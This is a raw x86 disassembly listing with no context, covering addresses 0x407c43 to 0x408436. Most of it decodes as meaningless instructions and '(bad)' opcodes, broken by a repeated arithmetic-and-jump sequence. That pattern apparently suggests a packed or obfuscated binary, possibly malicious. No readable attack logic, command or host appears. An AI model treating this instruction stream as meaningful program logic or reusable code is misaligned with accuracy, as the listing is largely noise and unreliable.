  407c43:	jnp    0x407bce
  407c45:	fadd   QWORD PTR [ebx]
  407c47:	stc    
  407c48:	jno    0x407bdc
  407c4a:	xor    bl,BYTE PTR [edx]
  407c4c:	dec    eax
  407c4d:	inc    ebp
  407c4e:	or     ebp,DWORD PTR [ebp-0x17]
  407c51:	jg     0x407c56
  407c53:	or     BYTE PTR [ebp-0x3614a4ba],bl
  407c59:	mov    BYTE PTR [esi],dh
  407c5b:	xor    al,0xb8
  407c5d:	and    al,0x8a
  407c5f:	mov    esi,0xf5168784
  407c64:	inc    esp
  407c65:	fwait
  407c66:	ins    DWORD PTR es:[edi],dx
  407c67:	ret    
  407c68:	in     al,dx
  407c69:	jmp    0x407cc6
  407c6b:	sti    
  407c6c:	pop    ss
  407c6d:	cmp    ah,BYTE PTR [esi]
  407c6f:	in     eax,dx
  407c70:	inc    ebx
  407c71:	mov    dh,0x67
  407c73:	lds    esp,FWORD PTR [edx+esi*4+0x27]
  407c77:	rcr    DWORD PTR [eax-0x3],cl
  407c7a:	push   ebp
  407c7b:	scas   al,BYTE PTR es:[edi]
  407c7c:	and    BYTE PTR [esi+eax*4+0x6e],0xf1
  407c81:	(bad)  
  407c82:	jmp    0xa978:0xb46a4eda
  407c89:	push   cs
  407c8a:	adc    eax,0x521d3599
  407c8f:	mov    ebx,0x490cdc67
  407c94:	vsqrtpd ymm7,YMMWORD PTR [ecx-0x7e165ee]
  407c9c:	fld    DWORD PTR [edx+0x73]
  407c9f:	and    ch,cl
  407ca1:	jae    0x407d22
  407ca3:	iretw  
  407ca5:	pop    ebx
  407ca6:	pusha  
  407ca7:	mov    bl,0x6e
  407ca9:	fdivr  DWORD PTR ds:0x33d8b645
  407caf:	shl    BYTE PTR [ebx],1
  407cb1:	clc    
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax-0x1ed1a5aa]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407d34
  407ce1:	jmp    0x407ce1
  407ce3:	leave  
  407ce4:	or     eax,0x3addec42
  407ce9:	mov    ebx,0xdadf16a9
  407cee:	mov    eax,0xec307cd5
  407cf3:	jns    0x407d67
  407cf5:	mov    edx,0xf5ce7d66
  407cfa:	popa   
  407cfb:	icebp  
  407cfc:	jl     0x407c8e
  407cfe:	push   ebx
  407cff:	mov    ?,WORD PTR cs:[ebx+0x50aeb621]
  407d06:	jecxz  0x407d65
  407d08:	sub    eax,0x4fb7c280
  407d0d:	xchg   ecx,eax
  407d0e:	adc    al,dl
  407d10:	ds push ds
  407d12:	inc    ebp
  407d13:	mov    bh,0x7d
  407d15:	xor    al,0xe7
  407d17:	pop    ecx
  407d18:	jge    0x407d3c
  407d1a:	inc    ecx
  407d1b:	test   esp,ecx
  407d1d:	lock xor eax,0x2bd84fb8
  407d23:	mov    al,0xff
  407d25:	mov    edi,0x74a11b92
  407d2a:	cwde   
  407d2b:	daa    
  407d2c:	and    BYTE PTR [eax+0x7fe77a68],0xa1
  407d33:	mov    dl,0x99
  407d35:	dec    eax
  407d36:	je     0x407d02
  407d38:	lds    eax,FWORD PTR [ebx-0x20]
  407d3b:	loopne 0x407d4c
  407d3d:	sbb    cl,BYTE PTR [ecx+eiz*2-0x36450817]
  407d44:	cmp    DWORD PTR [edi],esp
  407d46:	pop    ds
  407d47:	out    0x57,al
  407d49:	les    edi,FWORD PTR [eax+0x24]
  407d4c:	push   0x7a
  407d4e:	sahf   
  407d4f:	fisttp QWORD PTR [edi-0x429aca6]
  407d55:	cmp    BYTE PTR [ecx+0x6a42b34f],dh
  407d5b:	outs   dx,DWORD PTR ds:[esi]
  407d5c:	mov    cl,0x82
  407d5e:	mov    ebx,ebp
  407d60:	cmp    BYTE PTR [esi+0x39],ah
  407d63:	and    esp,esi
  407d65:	add    ch,BYTE PTR [ebp+0x6caf086c]
  407d6b:	and    eax,0x374ef7d4
  407d70:	imul   eax,esp,0x51e2966e
  407d76:	mov    eax,0x9b843662
  407d7b:	push   cs
  407d7c:	out    dx,eax
  407d7d:	js     0x407db8
  407d7f:	stos   BYTE PTR es:[edi],al
  407d80:	cdq    
  407d81:	jb     0x407db3
  407d83:	addr16 into 
  407d85:	cdq    
  407d86:	dec    edi
  407d87:	and    ah,al
  407d89:	push   ds
  407d8a:	mov    DWORD PTR ds:0x85ace998,edi
  407d90:	xchg   edx,eax
  407d91:	jmp    0x9549:0x80867ddb
  407d98:	jg     0x407e16
  407d9a:	adc    ebx,DWORD PTR [ecx]
  407d9c:	out    dx,eax
  407d9d:	pop    ss
  407d9e:	inc    ebx
  407d9f:	inc    esi
  407da0:	mov    ecx,0x6acbbf06
  407da5:	mov    ?,WORD PTR [ecx-0x62f10dc9]
  407dab:	loop   0x407d3b
  407dad:	or     BYTE PTR [ecx],cl
  407daf:	sbb    ebp,DWORD PTR ds:0x7d62f9b0
  407db5:	push   eax
  407db6:	lock loop 0x407e2f
  407db9:	popa   
  407dba:	(bad)  
  407dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dbc:	pop    ss
  407dbd:	call   0x11224c82
  407dc2:	pop    es
  407dc3:	cmp    edi,esi
  407dc5:	lods   eax,DWORD PTR ds:[esi]
  407dc6:	loopne 0x407d97
  407dc8:	mov    ch,0x32
  407dca:	fdiv   DWORD PTR [ebx-0x25]
  407dcd:	push   ebx
  407dce:	lahf   
  407dcf:	adc    edi,DWORD PTR [ecx+0x9]
  407dd2:	(bad)  [ebx+0x66c68010]
  407dd8:	stc    
  407dd9:	mov    ch,0x52
  407ddb:	adc    eax,0x5d275f12
  407de0:	or     dl,BYTE PTR [edx*8+0x4bacb704]
  407de7:	xchg   ebp,eax
  407de8:	(bad)  
  407de9:	and    bh,ch
  407deb:	out    0x24,eax
  407ded:	mov    eax,0x8050a407
  407df2:	fld    TBYTE PTR [eax+0x5d1bf222]
  407df8:	push   eax
  407df9:	push   DWORD PTR [edx-0x4e]
  407dfc:	outs   dx,BYTE PTR ds:[esi]
  407dfd:	and    edi,ecx
  407dff:	lds    esi,FWORD PTR [edi-0x12403d57]
  407e05:	mov    ch,0x5d
  407e07:	aad    0x73
  407e09:	mov    bl,0xad
  407e0b:	sbb    al,0x84
  407e0d:	lea    eax,[esi]
  407e0f:	mov    esi,DWORD PTR [esi]
  407e11:	outs   dx,DWORD PTR ds:[esi]
  407e12:	ins    DWORD PTR es:[edi],dx
  407e13:	ret    
  407e14:	sbb    eax,0x492c0019
  407e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e1a:	adc    ah,BYTE PTR [ebx]
  407e1c:	mov    BYTE PTR [ebp-0x44],bh
  407e1f:	xor    al,0x83
  407e21:	mov    ss,WORD PTR [ecx-0x488f46e3]
  407e27:	pop    esp
  407e28:	ret    
  407e29:	loop   0x407e9d
  407e2b:	loopne 0x407dc6
  407e2d:	cmp    ebx,DWORD PTR [esi-0x2397196f]
  407e33:	inc    ecx
  407e34:	pop    eax
  407e35:	mov    ds:0xb0523a68,eax
  407e3a:	(bad)  
  407e3b:	push   DWORD PTR [edx]
  407e3d:	mov    DWORD PTR [ebx],esp
  407e3f:	or     ebp,edx
  407e41:	dec    ecx
  407e42:	jbe    0x407e23
  407e44:	and    DWORD PTR [esi-0x18],edx
  407e47:	sub    ebp,DWORD PTR [ebp+edi*2+0x63]
  407e4b:	lock sbb BYTE PTR [esi],0x84
  407e4f:	or     eax,0x7424e90f
  407e54:	push   ecx
  407e55:	scas   eax,DWORD PTR es:[edi]
  407e56:	add    edi,DWORD PTR [ebx+0x6fb5a87c]
  407e5c:	out    0x2c,al
  407e5e:	mov    edx,edx
  407e60:	jp     0x407ded
  407e62:	add    al,bl
  407e64:	xchg   edi,eax
  407e65:	fldcw  WORD PTR [ebx-0x7a]
  407e68:	aam    0x43
  407e6a:	lahf   
  407e6b:	adc    al,BYTE PTR [esi]
  407e6d:	clc    
  407e6e:	jmp    0xf3a:0xd19793b
  407e75:	xchg   DWORD PTR [eax],ecx
  407e77:	add    BYTE PTR [eax],al
  407e79:	add    BYTE PTR [ebx-0x11162bab],cl
  407e7f:	or     BYTE PTR [eax],al
  407e81:	add    BYTE PTR [ebx+0x7d8bcc55],cl
  407e87:	cld    
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	fstp   TBYTE PTR [ebx]
  407e9f:	gs mov ch,0x11
  407ea2:	int    0x7e
  407ea4:	jle    0x407e30
  407ea6:	jg     0x407f26
  407ea8:	jle    0x407f10
  407eaa:	leave  
  407eab:	loopne 0x407e51
  407ead:	mov    edi,0x9d1562d2
  407eb2:	int    0x46
  407eb4:	fdiv   QWORD PTR [ebx+0x53359d15]
  407eba:	into   
  407ebb:	xchg   edi,eax
  407ebc:	(bad)  
  407ebd:	xchg   ebx,eax
  407ebe:	ja     0x407f38
  407ec0:	sbb    esi,0xdc2d81ce
  407ec6:	shl    BYTE PTR [eax],cl
  407ec8:	xor    DWORD PTR [ebp+ebp*8+0x11175204],0x7
  407ed0:	push   0xffd7a3dd
  407ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ed6:	jo     0x407ef6
  407ed8:	jmp    0xa5e9026e
  407edd:	aas    
  407ede:	inc    ebp
  407edf:	mov    ebx,0x2c5f829c
  407ee4:	xor    eax,0xc8c9d58a
  407ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eea:	fwait
  407eeb:	dec    edi
  407eec:	scas   eax,DWORD PTR es:[edi]
  407eed:	jno    0x407f11
  407eef:	xor    edx,edi
  407ef1:	data16 jns 0x407ea3
  407ef4:	push   ecx
  407ef5:	aad    0x4
  407ef7:	mov    edi,0xdbceb654
  407efc:	mov    edi,0x32325ffd
  407f01:	loopne 0x407ed6
  407f03:	nop
  407f04:	les    ebp,FWORD PTR [ecx-0x75]
  407f07:	imul   ebx,DWORD PTR [edi+0x32],0x62
  407f0b:	mov    ds:0x59834d18,eax
  407f10:	xor    DWORD PTR [eax+0x11],esi
  407f13:	and    edi,eax
  407f15:	sbb    eax,0x2417c9cc
  407f1a:	cmp    eax,0xa4e53501
  407f1f:	scas   eax,DWORD PTR es:[edi]
  407f20:	out    dx,al
  407f21:	sbb    DWORD PTR [esi-0x5f],ecx
  407f24:	mul    BYTE PTR [edi-0x62]
  407f27:	rol    DWORD PTR [esi],cl
  407f29:	arpl   WORD PTR cs:[ebx+0x4c],ax
  407f2d:	dec    edx
  407f2e:	jmp    0xc8a5:0x99917852
  407f35:	fild   WORD PTR ds:0x4a3065f
  407f3b:	and    DWORD PTR [eax+0x69],0xe2a3ce47
  407f42:	jns    0x407efa
  407f44:	sub    bl,BYTE PTR [edi+0x11]
  407f47:	jb     0x407ef1
  407f49:	lds    ebx,FWORD PTR [ecx+0x7c]
  407f4c:	add    bl,BYTE PTR [edi+0x3a9afc01]
  407f52:	(bad)  
  407f53:	mov    ecx,0xa95e2cf6
  407f58:	outs   dx,DWORD PTR ds:[esi]
  407f59:	inc    ebp
  407f5a:	mov    edx,0xd587ff46
  407f5f:	das    
  407f60:	int3   
  407f61:	pop    ebx
  407f62:	or     DWORD PTR [edx+0x1b],esp
  407f65:	daa    
  407f66:	inc    ebx
  407f67:	test   DWORD PTR [ebp-0x33462bab],0x5c6b1e90
  407f71:	cmp    edx,ebx
  407f73:	mov    ds:0x758d2c42,eax
  407f78:	xor    BYTE PTR [ebx-0x5e],bh
  407f7b:	je     0x407f93
  407f7d:	pop    ss
  407f7e:	int3   
  407f7f:	push   es
  407f80:	lods   eax,DWORD PTR ds:[esi]
  407f81:	mov    eax,DWORD PTR [ecx]
  407f83:	mov    ebp,0xa29c9c88
  407f88:	inc    edi
  407f89:	mov    ebx,0x7fd5a2c4
  407f8e:	ja     0x407fd6
  407f90:	pushf  
  407f91:	jb     0x407f31
  407f93:	xchg   DWORD PTR ds:0xf4ca902f,ecx
  407f99:	int3   
  407f9a:	aaa    
  407f9b:	or     BYTE PTR ds:0x7d137474,al
  407fa1:	cmp    BYTE PTR [eax],0x8d
  407fa4:	and    BYTE PTR [esi+0x57],ah
  407fa7:	fnstcw WORD PTR [eax]
  407fa9:	and    BYTE PTR [edi-0x7e7d5f3b],al
  407faf:	xchg   esp,eax
  407fb0:	shl    DWORD PTR [edi+0x1f],0xde
  407fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fb6:	repz or ebp,esi
  407fb9:	and    al,0xc1
  407fbb:	shl    DWORD PTR [esi-0xbc0d30b],cl
  407fc1:	mov    bh,0x3f
  407fc3:	sbb    al,0x42
  407fc5:	ins    BYTE PTR es:[edi],dx
  407fc6:	sbb    eax,0xa6d4e6bf
  407fcb:	jge    0x407f7c
  407fcd:	(bad)
  407fd0:	leave  
  407fd1:	add    eax,0xc7904b09
  407fd6:	test   bl,0x87
  407fd9:	inc    ebp
  407fda:	push   ebx
  407fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fdc:	aas    
  407fdd:	cmc    
  407fde:	std    
  407fdf:	jg     0x407fe1
  407fe1:	fiadd  WORD PTR [ebx]
  407fe3:	xor    ah,bl
  407fe5:	push   ebx
  407fe6:	mov    BYTE PTR [ebx+0x26],bh
  407fe9:	imul   BYTE PTR [ebp-0x22]
  407fec:	cli    
  407fed:	inc    ebx
  407fee:	idiv   BYTE PTR [eax]
  407ff0:	add    DWORD PTR [esi-0x846a650],ecx
  407ff6:	sbb    eax,0xbb65467c
  407ffb:	inc    ebp
  407ffc:	jb     0x40800f
  407ffe:	mov    ebp,0x5f2e2f8d
  408003:	cmc    
  408004:	pop    edx
  408005:	out    dx,eax
  408006:	mov    ah,0x7c
  408008:	ja     0x40802f
  40800a:	xchg   edi,eax
  40800b:	adc    BYTE PTR [eax+eiz*4+0x18020f92],bl
  408012:	pusha  
  408013:	adc    BYTE PTR [edx+0x2834fcb4],0xd0
  40801a:	add    DWORD PTR [esi],0x20
  40801d:	xchg   ecx,eax
  40801e:	or     BYTE PTR [ecx-0x69],cl
  408021:	dec    edx
  408022:	dec    ebp
  408023:	sbb    esp,DWORD PTR [esi]
  408025:	dec    ebx
  408026:	ret    0xde90
  408029:	ret    0x840a
  40802c:	jno    0x40806d
  40802e:	jb     0x408051
  408030:	addr16 mov ebp,0xa84925cf
  408036:	sub    eax,0x1421e8e9
  40803b:	push   ebx
  40803c:	repnz add edi,ecx
  40803f:	add    edx,ecx
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	mov    bl,0x2e
  40807b:	ins    BYTE PTR es:[edi],dx
  40807c:	mov    ch,0xad
  40807e:	retf   0x7e7e
  408081:	mov    bh,BYTE PTR [edi+0x7e]
  408084:	jle    0x4080b0
  408086:	pop    edx
  408087:	es jmp 0x408098
  40808a:	stc    
  40808b:	adc    DWORD PTR [ebp+0x631d13e],edx
  408091:	and    dh,dl
  408093:	rol    DWORD PTR [ebx-0x27],0xe1
  408097:	add    eax,0x3f01b603
  40809c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40809d:	sti    
  40809e:	push   cs
  40809f:	jb     0x4080fc
  4080a1:	aas    
  4080a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080a3:	test   BYTE PTR [edx],dh
  4080a5:	push   esp
  4080a6:	aam    0xcd
  4080a8:	into   
  4080a9:	dec    esp
  4080aa:	loopne 0x40810d
  4080ac:	push   esp
  4080ad:	fdivrp st(3),st
  4080af:	jbe    0x408042
  4080b1:	rol    DWORD PTR ds:0x3b5afe65,1
  4080b7:	cmc    
  4080b8:	lods   eax,DWORD PTR ds:[esi]
  4080b9:	arpl   WORD PTR [edi+ecx*2-0x39af657b],cx
  4080c0:	cmp    cl,BYTE PTR [edx+0x14]
  4080c3:	sub    DWORD PTR [eax-0x4c],esp
  4080c6:	test   DWORD PTR [ebx+0x20],edx
  4080c9:	push   0x1115076f
  4080ce:	fmul   st(5),st
  4080d0:	xchg   ebp,eax
  4080d1:	inc    edx
  4080d2:	repz push edx
  4080d4:	xor    BYTE PTR [eax+0x73e15438],bh
  4080da:	mov    al,0xba
  4080dc:	cld    
  4080dd:	xchg   BYTE PTR [bx+0x41c9],al
  4080e2:	stc    
  4080e3:	jb     0x4080b3
  4080e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080e6:	fdivr  DWORD PTR [ebp-0x4f]
  4080e9:	sti    
  4080ea:	xor    BYTE PTR ds:0xdfd156a,dl
  4080f0:	or     ecx,DWORD PTR [ebx]
  4080f2:	sahf   
  4080f3:	add    ebp,DWORD PTR [ebx]
  4080f5:	jnp    0x4080fa
  4080f7:	mov    al,ds:0xa1649929
  4080fc:	js     0x4080bf
  4080fe:	pop    ecx
  4080ff:	addr16 mov esp,0x6ea62e68
  408105:	(bad)  
  408106:	jmp    0x2fc4594c
  40810b:	xor    al,0xb8
  40810d:	stos   BYTE PTR es:[edi],al
  40810e:	xchg   ebx,eax
  40810f:	jno    0x4080f5
  408111:	xor    DWORD PTR [edi-0xfb5a559],eax
  408117:	(bad)  
  408118:	out    dx,eax
  408119:	cdq    
  40811a:	test   cl,0xe3
  40811d:	push   es
  40811e:	jmp    0x884a:0x6169c408
  408125:	out    dx,eax
  408126:	nop
  408127:	mov    al,0x59
  408129:	(bad)  [esi+0x430069db]
  40812f:	mov    ah,0xed
  408131:	cmp    eax,0x4e9dea28
  408136:	ins    BYTE PTR es:[edi],dx
  408137:	push   ss
  408138:	jno    0x4081af
  40813a:	pop    edx
  40813b:	cmc    
  40813c:	xor    DWORD PTR [ebp+0x70ca8460],0x1470cc12
  408146:	push   edi
  408147:	sti    
  408148:	push   ds
  408149:	pop    eax
  40814a:	mov    eax,0xf87376c1
  40814f:	xor    esp,DWORD PTR [ebx+0x700769d]
  408155:	call   0xc4be7b05
  40815a:	adc    al,0x2a
  40815c:	jae    0x4081ad
  40815e:	in     al,dx
  40815f:	adc    ch,BYTE PTR [esp+eax*2-0x22]
  408163:	data16 or cl,BYTE PTR [ebx-0x74]
  408167:	push   edi
  408168:	cmp    DWORD PTR [eax-0x46e4b9ab],0x675972fa
  408172:	ss fdivp st(1),st
  408175:	and    dl,bl
  408177:	jmp    0x4817:0x7604fc98
  40817e:	sub    DWORD PTR [edi+0x6a],edx
  408181:	inc    eax
  408182:	xchg   esi,eax
  408183:	xor    bh,ah
  408185:	icebp  
  408186:	sub    al,BYTE PTR ds:0xdb238bef
  40818c:	xchg   BYTE PTR [ebx+0x48cf23f1],ch
  408192:	inc    ecx
  408193:	xor    ecx,eax
  408195:	aaa    
  408196:	push   esi
  408197:	mov    DWORD PTR cs:[ebx+ebp*8-0x33],esp
  40819c:	in     eax,0xf4
  40819e:	out    dx,eax
  40819f:	scas   eax,DWORD PTR es:[edi]
  4081a0:	mov    ah,0x44
  4081a2:	ret    0xa212
  4081a5:	pop    esi
  4081a6:	(bad)  
  4081a7:	into   
  4081a8:	xor    ebp,esp
  4081aa:	dec    esp
  4081ab:	add    DWORD PTR [esp+edx*1+0x3f14c063],esp
  4081b2:	cmp    bh,bh
  4081b4:	adc    ah,cl
  4081b6:	enter  0x4a7a,0xab
  4081ba:	inc    edx
  4081bb:	int    0xca
  4081bd:	sub    BYTE PTR [ecx+0x538b99e6],dh
  4081c3:	push   edi
  4081c4:	add    al,0xbc
  4081c6:	or     esp,DWORD PTR [edx-0x50c443a9]
  4081cc:	lea    esi,[eax+ecx*4-0x419774bf]
  4081d3:	fstp   QWORD PTR [esi]
  4081d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081d6:	push   0x3fb009ff
  4081db:	fwait
  4081dc:	js     0x40825b
  4081de:	fldcw  WORD PTR [edx]
  4081e0:	mov    esp,DWORD PTR ds:[ebx+0x1c]
  4081e4:	jnp    0x4081a1
  4081e6:	pop    es
  4081e7:	(bad)  
  4081e8:	fwait
  4081e9:	aam    0x5a
  4081eb:	dec    eax
  4081ec:	xchg   edi,eax
  4081ed:	mov    ch,0xb2
  4081ef:	retf   0xb1e8
  4081f2:	mov    edi,0x91fbcea6
  4081f7:	jge    0x408261
  4081f9:	test   BYTE PTR [ecx],bl
  4081fb:	inc    esi
  4081fc:	stos   BYTE PTR es:[edi],al
  4081fd:	push   edi
  4081fe:	mov    dl,0x95
  408200:	push   0xbab6f601
  408205:	mov    eax,ds:0xd1946e00
  40820a:	mov    esp,0x6d80c107
  40820f:	sbb    DWORD PTR [edx+0x509738fc],ebp
  408215:	gs add eax,0xd103f580
  40821b:	jmp    0x4083cc
  408220:	dec    esp
  408221:	adc    BYTE PTR [edi],bh
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x399a:0x2dc02462
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x4081cd
  408239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40823a:	lahf   
  40823b:	jae    0x40822e
  40823d:	loopne 0x408276
  40823f:	dec    ecx
  408240:	sub    ebx,DWORD PTR [edx-0x40]
  408243:	out    dx,eax
  408244:	out    dx,eax
  408245:	ror    ecx,0x45
  408248:	lock adc al,BYTE PTR [ecx+edi*4]
  40824c:	sti    
  40824d:	sub    DWORD PTR [edx],esi
  40824f:	popf   
  408250:	mov    bh,BYTE PTR [esi+0xb13db7d]
  408256:	loop   0x408208
  408258:	adc    bl,BYTE PTR [ebp+0x4e2e1ff]
  40825e:	popa   
  40825f:	xlat   BYTE PTR ds:[ebx]
  408260:	scas   al,BYTE PTR es:[edi]
  408261:	gs mov bl,0x5
  408264:	xchg   edi,eax
  408265:	xor    al,0xa2
  408267:	inc    edx
  408268:	and    cx,WORD PTR [edx+0x5f5dc63d]
  40826f:	mov    bh,0x15
  408271:	adc    eax,0xa06deea8
  408276:	and    dl,BYTE PTR [eax-0xc]
  408279:	and    eax,0x99639c47
  40827e:	mov    WORD PTR [edi],cs
  408280:	imul   DWORD PTR [ebx-0x16ea76a6]
  408286:	pop    ebx
  408287:	data16 (bad) [edx-0x67]
  40828b:	test   BYTE PTR [ecx+eiz*2+0x2af44fe0],dl
  408292:	cli    
  408293:	(bad)  
  408294:	bound  ebp,QWORD PTR [ebp+0x56108001]
  40829a:	mov    ah,0x78
  40829c:	and    BYTE PTR [esi-0x717998ea],dl
  4082a2:	(bad)  
  4082a3:	jbe    0x4082fb
  4082a5:	push   edx
  4082a6:	xchg   ebx,eax
  4082a7:	arpl   WORD PTR [edx],si
  4082a9:	outs   dx,DWORD PTR ds:[esi]
  4082aa:	adc    ebx,0xffffffb1
  4082ad:	adc    DWORD PTR [ebp+esi*1-0x2fe9147c],eax
  4082b4:	or     dl,al
  4082b6:	dec    edi
  4082b7:	ss into 
  4082b9:	ja     0x408324
  4082bb:	popa   
  4082bc:	aam    0x14
  4082be:	and    DWORD PTR [edx+0xbaff6a0],ebx
  4082c4:	test   DWORD PTR [eax-0x1b2dca1a],ecx
  4082ca:	add    al,BYTE PTR [esi-0x55]
  4082cd:	jp     0x408339
  4082cf:	pop    ecx
  4082d0:	jne    0x408279
  4082d2:	dec    edi
  4082d3:	mov    edx,0xc4641478
  4082d8:	mov    BYTE PTR [ebx-0x2],al
  4082db:	lds    ebx,FWORD PTR [eax-0x644500dc]
  4082e1:	pop    esi
  4082e2:	in     al,dx
  4082e3:	sbb    DWORD PTR [ecx],0x37
  4082e6:	xor    bh,ch
  4082e8:	(bad)  
  4082e9:	das    
  4082ea:	int3   
  4082eb:	xchg   edi,eax
  4082ec:	sub    al,0xc8
  4082ee:	dec    edx
  4082ef:	not    DWORD PTR [esi]
  4082f1:	call   0xf528:0x6ae01809
  4082f8:	out    dx,eax
  4082f9:	pushf  
  4082fa:	xchg   esp,eax
  4082fb:	push   0x51
  4082fd:	push   ss
  4082fe:	pusha  
  4082ff:	in     eax,dx
  408300:	inc    eax
  408301:	mov    ch,0x11
  408303:	cli    
  408304:	(bad)  
  408305:	xchg   ebx,eax
  408306:	retf   0xd9e7
  408309:	cmp    al,0x24
  40830b:	adc    al,0x1b
  40830d:	mov    ch,0x82
  40830f:	stos   DWORD PTR es:[edi],eax
  408310:	inc    ecx
  408311:	sar    DWORD PTR [ebx],0x86
  408314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408316:	xor    BYTE PTR [ecx+0x582aca3f],al
  40831c:	jmp    0x9577e6bd
  408321:	les    esi,FWORD PTR [ebp+edx*4-0x3d3a8baa]
  408328:	clc    
  408329:	mov    eax,0x6cd2b61b
  40832e:	dec    edx
  40832f:	cmp    bh,dl
  408331:	push   ecx
  408332:	pop    esi
  408333:	(bad)  
  408335:	(bad)  
  408337:	je     0x4082c2
  408339:	test   al,0xa0
  40833b:	std    
  40833c:	push   es
  40833d:	mov    ebp,0x29f36485
  408342:	in     eax,0xd5
  408344:	mov    dh,0x35
  408346:	les    ebx,FWORD PTR [edi-0x2f1a8bc2]
  40834c:	xchg   edi,eax
  40834d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40834e:	test   eax,0x80b78d48
  408353:	mov    dl,0x6b
  408355:	js     0x408373
  408357:	sub    ebp,DWORD PTR [esi+0x6]
  40835a:	adc    al,0xca
  40835c:	adc    eax,0x8b49c62c
  408361:	in     al,dx
  408362:	push   cs
  408363:	test   al,0x20
  408365:	pop    es
  408366:	pop    ebx
  408367:	les    edi,FWORD PTR [edi-0x1b]
  40836a:	sbb    eax,0x1723e7d7
  40836f:	cmp    ch,BYTE PTR [ebx]
  408371:	retf   0x22a6
  408374:	cmp    al,0xbf
  408376:	jbe    0x408319
  408378:	jno    0x408326
  40837a:	xchg   ebp,eax
  40837b:	mov    ch,0x7e
  40837d:	and    DWORD PTR [edi],0x3a
  408380:	jo     0x408342
  408382:	xchg   esp,eax
  408383:	jae    0x408373
  408385:	ss push ecx
  408387:	stos   DWORD PTR es:[edi],eax
  408388:	test   DWORD PTR [ebx+0x2e196570],0xb1860d44
  408392:	cmp    dh,BYTE PTR [edi+0x4d7f5876]
  408398:	inc    ebp
  408399:	add    al,0xc0
  40839b:	push   ebp
  40839c:	lds    ebp,FWORD PTR [esi+eiz*2-0x1c]
  4083a0:	and    eax,0x3316190e
  4083a5:	and    BYTE PTR [edi-0x45],ch
  4083a8:	sbb    esp,edi
  4083aa:	and    BYTE PTR [esi+0x7967fe7b],0x1e
  4083b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083b2:	pop    ebp
  4083b3:	xor    bl,BYTE PTR [edx]
  4083b5:	or     eax,0xe72f2dad
  4083ba:	xor    BYTE PTR [esi+0x6c],ch
  4083bd:	and    ebp,eax
  4083bf:	mov    DWORD PTR [ebx+eiz*8],edx
  4083c2:	loope  0x4083dc
  4083c4:	sub    dl,cl
  4083c6:	push   0xffffff98
  4083c8:	shl    BYTE PTR [ecx+0x66],0xb1
  4083cc:	imul   edx,edi
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	mov    esp,0x5536bcb3
  4083ed:	leave  
  4083ee:	jle    0x40846e
  4083f0:	mov    bh,BYTE PTR [edi+0x7e]
  4083f3:	jle    0x40837b
  4083f5:	and    BYTE PTR [ecx+0x24],dh
  4083f8:	mov    cl,0x7d
  4083fa:	add    eax,DWORD PTR [esi]
  4083fc:	(bad)  
  4083fd:	pop    ebp
  4083fe:	call   0xd836dfcf
  408403:	(bad)  
  408404:	push   esi
  408405:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408407:	jns    0x4083ee
  408409:	enter  0x7dce,0x23
  40840d:	or     dh,BYTE PTR [esi-0x25b2f890]
  408413:	lock cmp al,0x98
  408416:	std    
  408417:	mov    bl,BYTE PTR [esi+0x34c776ae]
  40841d:	or     DWORD PTR [edx-0x2886812f],eax
  408423:	add    ebx,DWORD PTR [ecx-0x44a455eb]
  408429:	lods   eax,DWORD PTR ds:[esi]
  40842a:	inc    esp
  40842b:	mov    ds:0xc34bc448,al
  408430:	adc    bl,ah
  408432:	mov    dh,0x74
  408434:	dec    esp
  408435:	pop    es
  408436:	das    
